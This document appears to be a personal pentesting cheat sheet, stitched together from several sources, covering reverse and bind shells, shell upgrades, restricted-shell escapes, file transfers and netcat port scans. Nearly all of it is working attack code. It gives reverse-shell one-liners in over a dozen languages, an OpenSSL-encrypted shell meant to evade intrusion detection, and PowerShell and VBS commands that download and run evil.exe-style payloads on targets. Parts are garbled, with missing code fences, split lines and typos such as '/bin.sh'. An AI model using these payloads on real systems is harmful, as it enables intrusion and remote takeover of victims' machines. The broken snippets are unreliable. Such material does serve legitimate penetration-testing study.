# Shells

[TOC]

Cheatsheet: https://podalirius.net/en/articles/unix-reverse-shells-cheatsheet/

The following commands assume the listener is **127.0.0.1** and the port recieving the reverse shell is **4444**, which you shouldn't use because it's a metasploit default, and looks suspicious.

## awk
```bash
RHOST=127.0.0.1
RPORT=4444
awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = "/inet/tcp/0/" RHOST "/" RPORT;
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```

## C
```c
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>

#define REV_IP   "127.0.0.1"
#define REV_PORT 4444

int main(int argc, char *argv[]) {
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REV_IP);
    sa.sin_port = htons(REV_PORT);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    execve("/bin/sh", 0, 0);
    return 0;
}
```

Oneliner in shell to create and compile C reverse shell :
```bash
IP="127.0.0.1"; PORT=4444; printf "#include <stdio.h>\n#include <unistd.h>\n#include <arpa/inet.h>\n\nint main(int argc, char *argv[]){\n\tstruct sockaddr_in sa;\n\tsa.sin_family=AF_INET;\n\tsa.sin_addr.s_addr=inet_addr(\"$IP\");\n\tsa.sin_port=htons($PORT);\n\tint s = socket(AF_INET,SOCK_STREAM,0);\n\tconnect(s,(struct sockaddr *)&sa,sizeof(sa));\n\tdup2(s,0);\n\tdup2(s,1);\n\tdup2(s,2);\n\texecve(\"/bin/sh\",0,0);\n\treturn 0;\n}\n" > rev.c && gcc -Wall rev.c -o rev
```

## Dart
```dart
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("127.0.0.1",4444).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
```

### Go
```go
package main;
import "os/exec";
import "net";
func main(){
    c,_ := net.Dial("tcp","127.0.0.1:4444");
    cmd := exec.Command("/bin/sh");
    cmd.Stdin  = c;
    cmd.Stdout = c;
    cmd.Stderr = c;
    cmd.Run()
}
```

Oneliner version in a shell :
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/e.go && go run /tmp/e.go && rm /tmp/e.go
```

## Groovy
Groovy reverse shells are really useful to get a reverse shell on a Jenkins server, using the Script console in the administration panel.

```groovy
String host="127.0.0.1";
int port=4444;
String cmd="/bin.sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Lua
In a Lua script :
```lua
require('socket');
require('os');
t = socket.tcp();
t:connect('127.0.0.1','4444');
os.execute('/bin/sh -i <&3 >&3 2>&3');
```

Oneliner from a shell :
```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

## Netcat
### Netcat.traditional
```bash
nc -e /bin/sh 127.0.0.1 4444
```

### New netcat
```bash
mkfifo /tmp/f;nc 127.0.0.1 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
mknode /tmp/f p;nc 127.0.0.1 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
```

## Node.js
```js
require('child_process').exec('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1');
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

## OpenSSL
Encrypted reverse shell
An Encrypted reverse shell can help avoid automatic detection by network security monitoring tools (such as Intrusion Detection Systems (IDS)). To create one, you need to generate an SSL certificate and start an SSL listener on your attacking machine, then run the reverse shell payload on the target machine.

Generate SSL certificate:
```bash
openssl req -x509 -quiet -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```
Start an SSL listener on your attacking machine using openssl:
```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
Run the payload on target machine using openssl:
Short payload :
```bash
mkfifo /tmp/s;/bin/sh -i</tmp/s 2>&1|openssl s_client -quiet -connect 127.0.0.1:4444>/tmp/s 2>/dev/null;rm /tmp/s
```

Detailed payload :
```bash
mkfifo /tmp/pipesocket
/bin/sh -i < /tmp/pipesocket 2>&1 \
    | openssl s_client -quiet -connect 127.0.0.1:4444 > /tmp/pipesocket 2>/dev/null
rm/tmp/pipesocket
```

## Perl
```perl
use Socket
$ip = "127.0.0.1";
$port = 4444;
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
if(connect(S, sockaddr_in($port, inet_aton($ip)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
};
```

Oneliner from a shell :
```bash
perl -e 'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## PHP
With `exec`
From a shell:
```bash
php -r '$s=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
In a PHP file:
```php
<?php $s=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

With `shell_exec`
From a shell:
```bash
php -r '$s=fsockopen("127.0.0.1",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

In a PHP file:
```php
<?php $s=fsockopen("127.0.0.1",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

With backticks
From a shell:

php -r '$s=fsockopen("127.0.0.1",4444);`/bin/sh -i <&3 >&3 2>&3`;'
In a PHP file:

<?php $s=fsockopen("127.0.0.1",4444);`/bin/sh -i <&3 >&3 2>&3`; ?>
With system
From a shell:

php -r '$s=fsockopen("127.0.0.1",4444);system("/bin/sh -i <&3 >&3 2>&3");'
In a PHP file:

<?php $s=fsockopen("127.0.0.1",4444);system("/bin/sh -i <&3 >&3 2>&3"); ?>
With popen
From a shell:

php -r '$s=fsockopen("127.0.0.1",4444);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
In a PHP file:

<?php $s=fsockopen("127.0.0.1",4444);popen("/bin/sh -i <&3 >&3 2>&3", "r"); ?>
Python
Using subprocess module
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
Oneliner from a shell :

python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
Using pty module
import pty, socket, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4444));
os.dup2(s.fileno(), 0);
os.dup2(s.fileno(), 1);
os.dup2(s.fileno(), 2);
pty.spawn("/bin/sh")
Oneliner from a shell :

python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
Ruby
f = TCPSocket.open("127.0.0.1",4444).to_i;
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
Oneliner from a shell :

ruby -rsocket -e 'f=TCPSocket.open("127.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
Shell
Shell with /dev/tcp
0<&196;exec 196<>/dev/tcp/127.0.0.1/4444; sh <&196 >&196 2>&196
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
Shell with pipes and netcat
rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/p
rm -f /tmp/p;mknod /tmp/p p;cat /tmp/p|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/p
Socat
socat tcp:127.0.0.1:4444 exec:'bash -i',pty,stderr,setsid,sigint,sane &
TclSh
#!/usr/bin/tclsh
set s [socket 127.0.0.1 4444];
while 1 {
    puts -nonewline $s "$ ";
    flush $s;
    gets $s c;
    set e "exec $c";
    if {![catch {set r [eval $e]} err]} {
        puts $s $r;
    }
    flush $s;
}
close $s;
One liner :

echo 'set s [socket 127.0.0.1 4444];while 1 {puts -nonewline $s "\$ ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | /usr/bin/tclsh
Telnet
The “double telnet” version takes two ports, one for receiving commands (uplink) and one for sending back the results (downlink) :

telnet 127.0.0.1 4444 | /bin/sh -i | telnet <placeholder_ip> 4445
You can also create pipe redirections like we did in the netcat reverse shell :

With mkfifo :

rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 127.0.0.1 4444 > f
With mknod :

rm -f f;mknod f p&&telnet 127.0.0.1 4444 0<f|/bin/sh -i 1>f
Wget
More informations on this reverse shell, as well as the listener to use can be found in the article Constructing a reverse shell with wget.

IP=127.0.0.1;D=4444;U=$(($D + 1))
while true; do sleep 0.125; wget "http://${IP}:${U}" -o /dev/null -U "$($(wget -q "http://${IP}:${D}" -O- -o /dev/null 2>/dev/null) 2>&1 | base64 -w0)" 2>/dev/null; done



**netcat** is a utility which reads and writes data across network connections, using TCP or UDP protocols. Install the nmap version as follows:

```bash
sudo apt install -y ncat

# Usage: Connect to the IP on the pop3 port
nc -nv 10.11.0.22 110
```



## Reverse Shell

This is done with the example below. Options used are:
* `-n` skip DNS name resolution
* `-v` add verbosity
* `-l` create a listener
* `-p` specify port number

Example:
```bash
# Webshell payloads need to be URL-encoded in burpsuite to work.

# Send a reverse shell on Linux
nc 192.168.119.193 443 –e /bin/bash

# Send a reverse shell on Windows
nc.exe 192.168.100.113 4444 –e cmd.exe

# Send a reverse shell with PHP
php -r '$sock=fsockopen("192.168.119.193",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# Send a reverse shell with Perl
perl -e 'use Socket;$i="192.168.119.193";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Send a reverse shell with Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.193",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Send a reverse shell with Ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```



## Non-Interactive vs Interactive shells

When obtaining a reverse shell with a netcat listener, it is by default non-interactive and you cannot pass keyboard shortcuts or special characters such as tab. Programs such as su and sudo work poorly.

#### Upgrade with Python

Upgrading to a partially interactive bash shell:

```python
python -c 'import pty; pty.spawn("/bin/bash")'

# Then press CTRL+Z, and run the following commands on the attacker machine
stty raw -echo
fg

# Back on the target machine run this
export TERM=xterm
```

**Note you will not be able to see what you are typing in terminal after you change your `stty` setting**. You should now have tab autocomplete as well as be able to use interactive commands such as `su` and `nano`.

#### Upgrade with socat

Another mechanism to upgrade a shell is if `socat` is installed on the server:

```bash
# On Kali attack box
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

# To help get socat on the target
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

```

#### Upgrading with other methods

See https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
See https://netsec.ws/?p=337



### Escaping rbash (restricted shell) 

```bash
ssh user@10.x.x.x -t 'bash --noprofile'
```





## Transferring files

Netcat can also be used to transfer files, both text and binary, from one computer to another.

```bash
# Set up a listener for the file 
nc -nvlp 4444 > incoming.exe

# And send it on the remote computer
nc -nv 10.10.10.1 4444 < /usr/share/windows-resources/wget.exe

# Note, you'll need to Ctrl+C to cut the connection once 
# the file has transfered.
```

#### Transferring with vbs script

The following non-interactive commands can be used to create a script that transfers a file:

```powershell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge
t.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.
vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

This can then grab a file with the following command:

```powershell
cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```

#### Transferring with Powershell

Create a script with the following non-interactive commands:

```powershell
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

This is then used with the following command:

```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

Or do it as a one-liner:

``` powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')

# Or for a script
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
```

#### Transfering via hex

Compress `nc.exe`, convert it to hex, then paste it via non-interactive commands till an executable is built on the windows system.

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
upx -9 nc.exe
exe2hex -x nc.exe -p nc.cmd
# then cut & paste into the target system
```







## Creating a Bind shell

The `-e` option executes a command after connection and thusly isn't available in most versions of netcat, except kali and `ncat`. You can create a bind shell as follows:

```powershell
# Connect to the below port and cmd.exe will execute
nc -nvlp 4444 -e cmd.exe

# A windows executable version of nc.exe is in 
/usr/share/windows-resources/binaries
```



## Basic Portscan

Netcat can attempt to connect to port ranges and show the results.

* `-w` timeout in seconds
* `-z` zero-I/O mode
* `-u` UDP scan

```bash
# TCP scan
nc -nvv -w 1 -z 10.11.1.220 3388-3390

# UDP scan
nc -nv -u -z -w 1 10.11.1.115 160-162
```



## Commands to spawn a reverse shell
### Bash
Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) (this was tested on Ubuntu 10.10):

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### PERL

Here’s a shorter, feature-free version of the [perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell):

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

There’s also an [alternative PERL revere shell here](http://www.plenz.com/reverseshell).

### Python

This was tested under Linux / Python 2.7:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

If you want a .php file to upload, see the more featureful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

```
nc -e /bin/sh 10.0.0.1 1234
```

If you have the wrong version of netcat installed, [Jeff Price points out here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498) that you might still be able to get your reverse shell back like this:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### Java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

[Untested submission from anonymous reader]

### xterm

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

```
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

```
Xnest :1
```

You’ll need to authorise the target to connect to you (command also run on your host):

```
xhost +targetip
```




## JavaScript

node -e '...'

var exec = require('child_process').exec;
exec('/bin/bash', function (error, stdOut, stdErr) {
console.log(stdOut);
}); 

node -e "var exec = require('child_process').exec; exec(['cat /home/victim/key.txt'], function (error, stdOut, stdErr) {console.log(stdOut);});"

const { exec } = require('child_process');
exec('cat /home/victim/key.txt', (err, stdout, stderr) => {
  if (err) {
    //some err occurred
    console.error(err)
  } else {
   // the *entire* stdout and stderr (buffered)
   console.log(`stdout: ${stdout}`);
   console.log(`stderr: ${stderr}`);
  }
});
